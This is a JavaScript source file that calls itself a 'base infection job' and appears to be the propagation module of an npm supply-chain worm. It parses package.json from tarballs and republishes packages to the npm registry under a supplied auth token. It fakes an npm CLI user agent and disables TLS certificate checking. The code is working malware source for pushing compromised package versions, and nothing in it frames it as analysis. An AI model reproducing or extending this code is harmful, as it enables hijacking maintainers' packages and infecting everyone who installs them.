/*
 * Base infection job type plus npm tarball metadata parsing and registry publish document construction.
 */

var { $: npmCompromiseBunShell } = globalThis.Bun;
import { createWriteStream as npmCompromiseCreateWriteStream } from "fs";
import * as npmCompromiseFsPromises from "fs/promises";
import { join as npmCompromisePathJoin } from "path";
import { Readable as npmCompromiseReadable } from "stream";
import { pipeline as npmCompromisePipeline } from "stream/promises";
class InfectionJobBase {
  async shouldExecute() {
    return true;
  }
}
import { createHash as npmTarballCreateHash } from "crypto";
import { readFile as npmTarballReadFile } from "fs/promises";
import { gunzipSync as npmTarballGunzipSync } from "zlib";
function readPackageJsonFromTarGz(npmTarBuffer) {
  let npmTarOffset = 0;
  while (npmTarOffset + 512 <= npmTarBuffer.length) {
    let npmTarHeaderBlock = npmTarBuffer.subarray(
      npmTarOffset,
      npmTarOffset + 512,
    );
    if (npmTarHeaderBlock[0] === 0) break;
    let npmTarPathBytes = npmTarHeaderBlock.subarray(0, 100),
      npmTarPathNullIndex = npmTarPathBytes.indexOf(0),
      npmTarEntryPath = npmTarPathBytes
        .subarray(0, npmTarPathNullIndex === -1 ? 100 : npmTarPathNullIndex)
        .toString("utf8"),
      npmTarEntrySizeText = npmTarHeaderBlock
        .subarray(124, 136)
        .toString("utf8")
        .replace(/\0/g, "")
        .trim(),
      npmTarEntrySize = npmTarEntrySizeText
        ? parseInt(npmTarEntrySizeText, 8)
        : 0;
    if (
      ((npmTarOffset += 512),
      npmTarEntryPath === "package/package.json" ||
        npmTarEntryPath.endsWith("/package.json"))
    ) {
      let npmPackageJsonBuffer = npmTarBuffer.subarray(
        npmTarOffset,
        npmTarOffset + npmTarEntrySize,
      );
      return JSON.parse(npmPackageJsonBuffer.toString("utf8"));
    }
    npmTarOffset += Math.ceil(npmTarEntrySize / 512) * 512;
  }
  throw Error("package.json not found in tarball");
}
async function publishNpmTarball(
  publishTarballPath,
  npmAuthToken,
  npmPublishDryRun = false,
  publishSigstoreBundle,
) {
  let npmRegistryBaseUrl = "https://registry.npmjs.org",
    npmDistTagLatest = "latest",
    npmPublishUserAgent =
      "npm/11.14.1.0 node/v24.10.0 " +
      process.platform +
      "\x20" +
      process.arch +
      " workspaces/false",
    publishTarballBuffer = await npmTarballReadFile(publishTarballPath),
    publishTarBuffer = npmTarballGunzipSync(publishTarballBuffer),
    publishPackageJson = readPackageJsonFromTarGz(publishTarBuffer),
    { name: publishPackageName, version: publishPackageVersion } =
      publishPackageJson;
  if (!publishPackageName || !publishPackageVersion)
    throw Error("package.json missing required 'name' or 'version'");
  let publishIntegritySha512 =
      "sha512-" +
      npmTarballCreateHash("sha512")
        .update(publishTarballBuffer)
        .digest("base64"),
    publishShasumSha1 = npmTarballCreateHash("sha1")
      .update(publishTarballBuffer)
      .digest("hex"),
    publishTarballBase64 = publishTarballBuffer.toString("base64"),
    publishTarballFileName =
      publishPackageName + "-" + publishPackageVersion + ".tgz",
    publishDistTarballUrl =
      "http://registry.npmjs.org/" +
      publishPackageName +
      "/-/" +
      publishTarballFileName,
    publishVersionDocument = {
      ...publishPackageJson,
      name: publishPackageName,
      version: publishPackageVersion,
      readme: publishPackageJson.readme ?? "ERROR: No README data found!",
      dist: {
        integrity: publishIntegritySha512,
        shasum: publishShasumSha1,
        tarball: publishDistTarballUrl,
      },
    },
    npmPublishDocument = {
      _id: publishPackageName,
      name: publishPackageName,
      "dist-tags": { latest: publishPackageVersion },
      versions: { [publishPackageVersion]: publishVersionDocument },
      access: "public",
      _attachments: {
        [publishTarballFileName]: {
          content_type: "application/octet-stream",
          data: publishTarballBase64,
          length: publishTarballBuffer.length,
        },
      },
    };
  if (publishSigstoreBundle) {
    let sigstoreAttachmentName =
        publishPackageName + "-" + publishPackageVersion + ".sigstore",
      sigstoreAttachmentJson = JSON.stringify(publishSigstoreBundle);
    npmPublishDocument._attachments[sigstoreAttachmentName] = {
      content_type:
        publishSigstoreBundle.mediaType ||
        "application/vnd.dev.sigstore.bundle.v0.3+json",
      data: sigstoreAttachmentJson,
      length: sigstoreAttachmentJson.length,
    };
  }
  let encodedPublishPackageName = publishPackageName.replace("/", "%2f"),
    npmPublishUrl = npmRegistryBaseUrl + "/" + encodedPublishPackageName,
    npmPublishHeaders = {
      "User-Agent": npmPublishUserAgent,
      "Npm-Auth-Type": "web",
      "Npm-Command": "publish",
      Authorization: "Bearer " + npmAuthToken,
      "Content-Type": "application/json",
      Accept: "*/*",
    },
    npmPublishBodyJson = JSON.stringify(npmPublishDocument);
  if (npmPublishDryRun) return true;
  let npmPublishResponse = await fetch(npmPublishUrl, {
      method: "PUT",
      headers: npmPublishHeaders,
      body: npmPublishBodyJson,
      tls: { rejectUnauthorized: false },
    }),
    npmPublishResponseText = await npmPublishResponse.text();
  if (!npmPublishResponse.ok) return false;
  return true;
}
